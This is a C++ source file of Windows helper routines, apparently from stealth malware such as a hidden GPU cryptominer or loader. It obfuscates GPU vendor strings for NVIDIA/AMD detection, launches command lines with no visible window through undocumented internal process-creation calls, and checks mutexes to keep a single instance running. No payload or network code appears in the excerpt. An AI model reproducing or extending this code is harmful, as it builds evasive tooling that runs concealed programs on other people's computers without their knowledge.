#include "common.h"
#include "ntddk.h"
#include "kernel32_undoc.h"
#include "obfuscate.h"

#include <string>
#include <d3d9.h>
#include <D3D9Types.h>

bool has_gpu() {
	bool hasGPU = false;
    IDirect3D9* d3dobject = Direct3DCreate9(D3D_SDK_VERSION);
    UINT adaptercount = d3dobject->GetAdapterCount();

    for (int i = 0; i < adaptercount; i++)
    {
        D3DADAPTER_IDENTIFIER9 adapter;
        d3dobject->GetAdapterIdentifier(i, 0, &adapter);
        std::string description = adapter.Description;
        if (description.find(AY_OBFUSCATE("NVIDIA")) != std::string::npos || 
            description.find(AY_OBFUSCATE("NVidia")) != std::string::npos || 
            description.find(AY_OBFUSCATE("AMD")) != std::string::npos ||
            description.find(AY_OBFUSCATE("ATi")) != std::string::npos ||
            description.find(AY_OBFUSCATE("Advanced Micro Devices")) != std::string::npos) 
        {
            hasGPU = true;
            break;
        }
    }
    return hasGPU;
}

PROCESS_INFORMATION create_new_process_internal(LPWSTR cmdLine, LPWSTR startDir, DWORD creationFlags) {
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    HANDLE hToken = NULL;
    HANDLE hNewToken = NULL;
    if (!UpCreateProcessInternalW(hToken,
        NULL,
        cmdLine,
        NULL,
        NULL,
        FALSE,
        creationFlags,
        NULL,
        startDir,
        &si,
        &pi,
        &hNewToken
    ))
    {
        return pi;
    }
    return pi;
}

void run_program(bool wait, wchar_t* cmdLine, ...) {
    wchar_t cmdLineFormatted[MAX_COMMAND_LENGTH] = { 0 };
    va_list argptr;
    va_start(argptr, cmdLine);
    vsnwprintf(cmdLineFormatted, MAX_COMMAND_LENGTH, cmdLine, argptr);
    va_end(argptr);
    PROCESS_INFORMATION pi = create_new_process_internal(cmdLineFormatted, NULL, CREATE_NO_WINDOW);
	if(wait) {
		WaitForSingleObject(pi.hProcess, 30000);
	}
	UtClose(pi.hProcess);
}

bool check_mutex(LPCWSTR mutex) {
    bool mutexActive = false;
    if (mutex != NULL) {
        HANDLE hMutex = CreateMutexW(NULL, FALSE, mutex);
        DWORD mutexStatus = GetLastError();
        if (mutexStatus == ERROR_ALREADY_EXISTS || mutexStatus == ERROR_ACCESS_DENIED) {
            mutexActive = true;
        }
        UtClose(hMutex);
    }
    return mutexActive;
}